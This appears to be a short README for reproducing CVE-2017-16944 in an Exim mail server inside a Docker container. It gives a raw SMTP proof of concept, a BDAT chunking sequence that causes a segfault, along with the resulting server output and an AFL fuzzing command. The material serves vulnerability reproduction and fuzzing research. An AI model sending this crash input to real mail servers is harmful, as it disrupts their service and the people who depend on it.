# Simple POC with docker image

All in one command:
```
docker run --rm -i exim-16944  < testsuite/cve-2017-16944.txt
```


Run the docker container:
```
docker run -ti exim-16944
```

Then feed it a simple POC:
```
EHLO localhost
MAIL FROM:<test@localhost>
RCPT TO:<test@localhost>
BDAT 10
.
BDAT 0
```

This should do:
```
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
250 0 byte chunk received
```
This results in a segfault. You don't see it when running under docker this way,
but it's there.


To see the segfault, run two terminals:
1. Terminal a: `docker run -ti exim-16944 bash; /usr/exim/bin/exim -bs -v`
2. Terminal b: The POC above


## Fuzzing with AFL
```
mkdir out
afl-fuzz -x dictionary.txt -i testsuite -o out -- /usr/exim/bin/exim -bs  -v
```
